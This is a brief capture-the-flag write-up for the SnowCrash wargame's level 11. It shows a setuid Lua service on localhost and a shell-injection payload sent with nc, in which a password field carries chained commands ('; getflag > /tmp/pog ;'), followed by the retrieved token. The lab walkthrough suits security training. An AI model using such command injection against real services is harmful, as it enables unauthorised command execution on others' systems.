# Snowcrash11

This one is pretty simple

```sh
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
We have access to a lua script that tries into baiting us to reversing a hash (i found this particuliar one online)
But the goal here is shell injection, and i can be done with nc (as intended)



```sh
level11:~$ nc 127.0.0.1 5151
Password: test ; getflag > /tmp/pog ; ls
Erf nope..
level11:~$ cat /tmp/pog
Check flag.Here is your token : REDACTED
```
Told ya